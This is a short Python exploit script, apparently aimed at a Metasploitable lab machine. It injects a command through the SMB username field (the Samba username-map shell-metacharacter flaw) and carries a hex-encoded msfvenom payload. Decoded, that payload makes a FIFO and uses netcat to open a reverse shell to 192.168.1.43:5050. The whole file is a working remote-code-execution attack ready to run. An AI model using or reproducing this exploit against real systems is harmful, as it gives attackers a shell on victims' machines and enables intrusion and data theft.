from smb.SMBConnection import SMBConnection
import random, string
from smb import smb_structs
smb_structs.SUPPORT_SMB2 = False
import sys

# Use the command line argument as the target: 
if len(sys.argv) < 2:
    print ("\nPlease Read 'Usage.md'\n")
    sys.exit()


# Default Shell Code: 
# msfvenom -p cmd/unix/reverse_netcat lhost=<YOUR_IP> lport=<YOUR_PORT> -f python 

buf =  b""
buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6d"
buf += b"\x64\x71\x6e\x78\x67\x6d\x3b\x20\x6e\x63\x20\x31\x39"
buf += b"\x32\x2e\x31\x36\x38\x2e\x31\x2e\x34\x33\x20\x35\x30"
buf += b"\x35\x30\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x6d\x64\x71"
buf += b"\x6e\x78\x67\x6d\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73"
buf += b"\x68\x20\x3e\x2f\x74\x6d\x70\x2f\x6d\x64\x71\x6e\x78"
buf += b"\x67\x6d\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d\x20\x2f"
buf += b"\x74\x6d\x70\x2f\x6d\x64\x71\x6e\x78\x67\x6d"


username = "/=`nohup " + buf.decode() + "`"
password = ""
conn = SMBConnection(username, password, "SOMEBODYHACKINGYOU" , "METASPLOITABLE", use_ntlm_v2 = False)
assert conn.connect(sys.argv[1], 445)